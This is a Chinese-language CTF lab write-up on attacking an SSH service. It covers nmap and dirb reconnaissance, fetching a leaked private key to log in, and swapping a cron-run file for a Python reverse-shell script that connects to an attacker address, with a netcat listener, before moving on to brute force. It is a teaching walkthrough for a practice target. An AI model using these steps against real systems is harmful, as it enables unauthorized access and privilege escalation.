{"title":"SSH服务渗透测试","date":"2019-07-07T11:48:30.000Z","thumbnail":"https://i.loli.net/2019/07/08/5d222c3a6031187345.jpg","link":"post/CTF-SSH-service-penetration","comments":true,"tags":["CTF","SSH"],"categories":["CTF"],"updated":"2019-07-07T17:30:47.293Z","content":"<h2 id=\"一、SSH协议议介绍\"><font color=\"#FF6347\" face=\"Comic sans MS\">一、SSH协议议介绍</font><a href=\"post/CTF-SSH-service-penetration#一、SSH协议议介绍\"></a></h2><p>SSH 为 Secure Shell 的缩写，由LETF的网络小组（Network Working Group）所制定；SSH为建立在应用层基础上的安全协议。</p>\n<p>SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>\n<p>SSH 最初是 UNIX 系统上的一个程序，后来又迅速扩展到其他操作平台。SSH 在正确使用时可弥补网络中的漏洞。SSH 客户端适用于多种平台。几乎所有 UNIX 平台一包括 HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行 SSH。<font color=\"#FF7F00\" size=\"4\"><strong>基于 TCP 22号端口的服务。</strong></font></p>\n<h2 id=\"二、SSH-协议认证机制\"><font color=\"#FF6347\" face=\"Comic sans MS\">二、SSH 协议认证机制</font><a href=\"post/CTF-SSH-service-penetration#二、SSH-协议认证机制\"></a></h2><p><strong>基于口令的安全验证</strong></p>\n<p>只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。</p>\n<p><strong>基于密匙的安全验证</strong></p>\n<p>需要依靠密匙，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到 SSH 服务器上，客户端软件就会向服务器发出请求，请求用你的私有密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的私有密匙进行比较。如果两个密匙一致，则验证成功，登陆服务器。</p>\n<ul>\n<li>id_rsa 为私钥</li>\n<li>id_rsa.pub 为公钥</li>\n</ul>\n<h2 id=\"三、SSH-协议验证机制弱点\"><font color=\"#FF6347\" face=\"Comic sans MS\">三、SSH 协议验证机制弱点</font><a href=\"post/CTF-SSH-service-penetration#三、SSH-协议验证机制弱点\"></a></h2><p><strong>基于口令的安全验证</strong></p>\n<p>基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的一定控制。（不一定是 root 权限）</p>\n<p><strong>基于密钥的安全验证</strong></p>\n<p>通过对主机信息收集，获取到泄露的用户名和对应的密钥，使用如下命令</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">chmod <span class=\"token number\">600</span> id_rsa\nssh <span class=\"token operator\">-</span>i id_rsa 用户名@主机地址  <span class=\"token comment\" spellcheck=\"true\">//登陆服务器。（不一定是root权限）</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"四、渗透测试\"><font color=\"#FF6347\" face=\"Comic sans MS\">四、渗透测试</font><a href=\"post/CTF-SSH-service-penetration#四、渗透测试\"></a></h2><p>题目如下<br><img src=\"https://i.loli.net/2019/07/07/5d21e6cd7f22271121.png\" alt=\"1\"></p>\n<h3 id=\"4-1-信息探测\"><font color=\"#3CB371\" face=\"Comic sans MS\">4.1 信息探测</font><a href=\"post/CTF-SSH-service-penetration#4-1-信息探测\"></a></h3><p>对于给定 IP 地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。</p>\n<ol>\n<li><p>探测靶场开放的服务与服务的版本</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">nmap <span class=\"token operator\">-</span>sV 靶场IP地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>探测靶场全部信息</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">nmap <span class=\"token operator\">-</span>A <span class=\"token operator\">-</span>v 靶场IP地址  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>探测靶场的操作系统类型与版本</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">nmap <span class=\"token operator\">-</span>O 靶场IP地址  <span class=\"token comment\" spellcheck=\"true\">//英文字母大O</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ol>\n<p>版本扫描结果：<br><img src=\"https://i.loli.net/2019/07/07/5d21e7815fcc333448.png\" alt=\"2\"></p>\n<h3 id=\"4-2-分析探测结果\"><font color=\"#3CB371\" face=\"Comic sans MS\">4.2 分析探测结果</font><a href=\"post/CTF-SSH-service-penetration#4-2-分析探测结果\"></a></h3><blockquote>\n<p><strong>对于SSH服务的22端口的靶场首先考虑</strong></p>\n<ol>\n<li>暴力破解</li>\n<li>私钥泄露（私钥文件有没有对应的密码、是否可以找到私钥的用户名用于后续提权）</li>\n</ol>\n</blockquote>\n<blockquote>\n<p><strong>对于开放http服务的80端口或者其他端口的靶场首先考虑</strong></p>\n<ol>\n<li>通过浏览器访问对应的靶场http服务，如 http://靶场IP地址:http服务端口 </li>\n<li>使用探测工具对http的目录进行探测，如 dirb http://靶场IP地址:http服务端口 </li>\n</ol>\n</blockquote>\n<p><font color=\"#FF7F00\" size=\"4\"><strong>特别注意特殊端口（大于1024的端口）</strong></font></p>\n<h3 id=\"4-3-挖掘敏感信息\"><font color=\"#3CB371\" face=\"Comic sans MS\">4.3 挖掘敏感信息</font><a href=\"post/CTF-SSH-service-penetration#4-3-挖掘敏感信息\"></a></h3><blockquote>\n<p>1、使用浏览器对靶场IP的http服务探测，对页面中展示的内容也要注意，尤其是<font color=\"red\">联系人等信息</font>（有可前能就是ssh的用户名信息），递归访问，力争把每一个 dirb 扫描到的目录页面都访问查看；<br>2、尤其对 robots.txt、以及一些目录进行访问，挖掘具备利用价值的信息。对于开放ssh服务的靶场，务必要注意是否可以寻找到 ssh私钥信息（id_rsa);<br>3、对于某些靶场，也可以使用nikto扫描器来挖掘敏感信息</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">nikto <span class=\"token operator\">-</span>host 靶场IP地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>4、特别注意 config 等特殊敏感文件，要细读扫描的结果。挖掘可以利用的敏感信息，比如在配置信息中就获取了数据库登录名和密码等信息；</p>\n</blockquote>\n<p>开始对目标IP进行探测，探测目录页面隐藏文件。</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">dirb http<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span><span class=\"token number\">192.168</span><span class=\"token punctuation\">.</span><span class=\"token number\">1.106</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>探测结果如下图，尝试对其中的信息访问，居然得到了私钥文件的信息。<br><img src=\"https://i.loli.net/2019/07/07/5d21f3782cf4e26995.png\" alt=\"3\"></p>\n<p>或者使用nikto探测，探测结果如下图，也好做个对比，实际上dirb更好用些。<br><img src=\"https://i.loli.net/2019/07/07/5d21f53a8e98d17420.png\" alt=\"4\"></p>\n<h3 id=\"4-4-利用敏感、弱点信息\"><font color=\"#3CB371\" face=\"Comic sans MS\">4.4 利用敏感、弱点信息</font><a href=\"post/CTF-SSH-service-penetration#4-4-利用敏感、弱点信息\"></a></h3><p><strong>对挖掘到的SSH密钥利用</strong></p>\n<ol>\n<li>修改 id_rsa 的权限<pre class=\"line-numbers language-c\"><code class=\"language-c\">chmod <span class=\"token number\">600</span> id_rsa<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li>利用私钥登陆服务器<pre class=\"line-numbers language-c\"><code class=\"language-c\">ssh <span class=\"token operator\">-</span>i id_rsa 用户名@靶场IP地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ol>\n<p><font color=\"#FF7F00\"><strong>注意：如果id_rsa不需要解密密码时，可以直接使用。但是如果id_rsa需要解密密码时，那么就需要进行对应的破解。（使用john-zcat）</strong></font></p>\n<blockquote>\n<p>一、下载私钥文件</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">wget http<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span><span class=\"token number\">192.168</span><span class=\"token punctuation\">.</span><span class=\"token number\">1.106</span><span class=\"token operator\">/</span>icons<span class=\"token operator\">/</span>VDSoyuAXio<span class=\"token punctuation\">.</span>txt\nmv到桌面并重命名为id_rsa<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://i.loli.net/2019/07/07/5d21fa4e3b80b66965.png\" alt=\"5\"></p>\n</blockquote>\n<blockquote>\n<p>二、尝试登陆远程服务器</p>\n<ol>\n<li>题目已开始图片最下方给了三个用户，后面又出现了一个邮箱，则尝试使用用户martin进行登陆<pre class=\"line-numbers language-c\"><code class=\"language-c\">chmod <span class=\"token number\">600</span> id_rsa\nssh <span class=\"token operator\">-</span>i id_rsa martin@<span class=\"token number\">192.168</span><span class=\"token punctuation\">.</span><span class=\"token number\">1.106</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n登陆成功，然后<code>pwd、cd /home --&gt; ls</code>分别查看当前目录和服务器主目录下共有几个用户文件夹。</li>\n</ol>\n</blockquote>\n<h3 id=\"4-5-扩大战果\"><font color=\"#3CB371\" face=\"Comic sans MS\">4.5 扩大战果</font><a href=\"post/CTF-SSH-service-penetration#4-5-扩大战果\"></a></h3><p><strong>登录服务器之后，我们需要做以下操作。</strong></p>\n<ol>\n<li>查看当前用户 <code>whoami</code> </li>\n<li>使用命令<code>id</code>查看当前用户的权限 </li>\n<li>查看根目录(<code>/root</code>)寻找 flag 文件</li>\n</ol>\n<p>如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权般情况下，flag文件只属于 root用户和对应的用户组；</p>\n<ul>\n<li><code>cat/etc/passwd</code> 查看所有用户的列表 </li>\n<li><code>cat/etc/group</code> 查看用户组</li>\n<li><code>find /-user 用户名</code> 查看属于某些用户的文件 </li>\n<li><code>cd /tmp</code> 查看缓冲文件目录，通常CTF中常把定时执行的一些文件放在临时目录下（开机后消失）</li>\n<li><code>cd /etc/crontab</code> 查看服务器定时执行任务，只有root用户可以编辑</li>\n</ul>\n<blockquote>\n<p>通常对Linux提权的两种方式</p>\n<ol>\n<li>通过用户登陆主机，但是没有用户的密码，如本例的通过ssh登陆，这个时候就需要查找具有root权限的文件，恰当使用该文件来获取root权限；</li>\n<li>若通过用户登陆主机，且已经得知用户密码，则直接使用命令<strong><code>sudo su</code></strong>或者<strong><code>sudo root</code></strong>然后输入用户密码即可。</li>\n</ol>\n</blockquote>\n<h3 id=\"4-6-深入挖掘\"><font color=\"#3CB371\" face=\"Comic sans MS\">4.6 深入挖掘</font><a href=\"post/CTF-SSH-service-penetration#4-6-深入挖掘\"></a></h3><ol>\n<li><p>通过 <code>/etc/crontab</code> 文件，设定系统定期执行的任务，编辑，需要 root 权限。不同的用户都可以有不同的定时任务。</p>\n</li>\n<li><p><code>cat /etc/crontab</code> 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器的某个文件。</p>\n</li>\n<li><p>如果在 <code>/etc/crontab</code> 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后用<strong>netcat</strong>执行监听获取对应用户的权限。</p>\n</li>\n<li><p>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。</p>\n</li>\n</ol>\n<blockquote>\n<p>通过<code>cat /etc/crontab</code>命令可查看到jimmy用户正在使用<code>/tmp</code>下的一个python文件做定时任务，如下图<br><img src=\"https://i.loli.net/2019/07/08/5d221a8053c1724183.png\" alt=\"6\"></p>\n</blockquote>\n<p>则我们可以构造一个反弹shell的python文件，重命名为jimmy定时执行的那个文件名，然后用netcat来监听反弹回来的shell。</p>\n<p><strong>1.执行反弹shell的代码</strong></p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token comment\" spellcheck=\"true\">##!/usr/bin/python  该程序是服务器端不是客户端！！！</span>\n<span class=\"token keyword\">import</span> os<span class=\"token punctuation\">,</span>subprocess<span class=\"token punctuation\">,</span>socket\ns<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">.</span>socekt<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>  <span class=\"token comment\" spellcheck=\"true\">#创建一个套接字，用以接受客户端的请求</span>\ns<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>“攻击机IP地址”<span class=\"token punctuation\">,</span>“攻击机监听端口”）   <span class=\"token comment\" spellcheck=\"true\">#对于服务器端来说就是正在监听来自攻击机IP地址的主机，且监听该IP的某端口号</span>\nos<span class=\"token punctuation\">.</span>dup2<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>                     <span class=\"token comment\" spellcheck=\"true\">#将标准输入输出赋值给套接字文件标志符，使套接字能够进行标准</span>\nos<span class=\"token punctuation\">.</span>dup2<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>                     <span class=\"token comment\" spellcheck=\"true\">#输入输出和错误输入输出</span>\nos<span class=\"token punctuation\">.</span>dup2<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-i\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\" spellcheck=\"true\">#用子进程以交互模式调用本机（服务端）的shell给攻击端</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可参考<font color=\"#00B2EE\"><a href=\"https://www.liaoxuefeng.com/wiki/1016959663602400/1017787560490144\" target=\"_blank\" rel=\"noopener\">廖雪峰的官方网站-网络编程</a></font></p>\n<p><strong>2.攻击端设置好用于监听的端口</strong><br>査看占用端口： <code>netstat -pantu</code>，设置一个大于1024但是没被使用的端口号；<br>攻击机使用netcat命令： <code>nc -lpv 未占用端口</code>，设置好监听</p>\n<ul>\n<li>l：监听模式</li>\n<li>p：对应的port</li>\n<li>v：返回详细信息</li>\n</ul>\n<p><strong>3.接收到反弹回来的shell</strong></p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\">whoami  <span class=\"token comment\" spellcheck=\"true\">//查看当前用户</span>\nid      <span class=\"token comment\" spellcheck=\"true\">//查看当前用户权限或该用户是否属于root组</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>和前一个用户martin一样，发现并没有root权限，且切换到<code>/home/用户名</code>目录下，查看并没有可以提升root权限的文件，则最后只能对剩下的Hadi用户进行ssh暴力破解了。使用Metasploit对其进行连接服务器ssh服务暴力破解。</p>\n","next":{"title":"CTF-SSH私钥泄漏","link":"post/CTF-SSH-private-key-leak"},"plink":"https://Directoree.github.io/post/CTF-SSH-service-penetration/","toc":[{"title":"<font color=\"#FF6347\" face=\"Comic sans MS\">一、SSH协议议介绍</font>","id":"一、SSH协议议介绍","index":"1"},{"title":"<font color=\"#FF6347\" face=\"Comic sans MS\">二、SSH 协议认证机制</font>","id":"二、SSH-协议认证机制","index":"2"},{"title":"<font color=\"#FF6347\" face=\"Comic sans MS\">三、SSH 协议验证机制弱点</font>","id":"三、SSH-协议验证机制弱点","index":"3"},{"title":"<font color=\"#FF6347\" face=\"Comic sans MS\">四、渗透测试</font>","id":"四、渗透测试","index":"4","children":[{"title":"<font color=\"#3CB371\" face=\"Comic sans MS\">4.1 信息探测</font>","id":"4-1-信息探测","index":"4.1"},{"title":"<font color=\"#3CB371\" face=\"Comic sans MS\">4.2 分析探测结果</font>","id":"4-2-分析探测结果","index":"4.2"},{"title":"<font color=\"#3CB371\" face=\"Comic sans MS\">4.3 挖掘敏感信息</font>","id":"4-3-挖掘敏感信息","index":"4.3"},{"title":"<font color=\"#3CB371\" face=\"Comic sans MS\">4.4 利用敏感、弱点信息</font>","id":"4-4-利用敏感、弱点信息","index":"4.4"},{"title":"<font color=\"#3CB371\" face=\"Comic sans MS\">4.5 扩大战果</font>","id":"4-5-扩大战果","index":"4.5"},{"title":"<font color=\"#3CB371\" face=\"Comic sans MS\">4.6 深入挖掘</font>","id":"4-6-深入挖掘","index":"4.6"}]}],"reward":true,"copyright":{"author":"Directoree","link":"<a href=\"https://Directoree.github.io/post/CTF-SSH-service-penetration/\" title=\"SSH服务渗透测试\">https://Directoree.github.io/post/CTF-SSH-service-penetration/</a>","license":"Attribution-NonCommercial-NoDerivatives 4.0 International (<a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\" rel=\"external nofollow noopener\" target=\"_blank\">CC BY-NC-ND 4.0</a>)"}}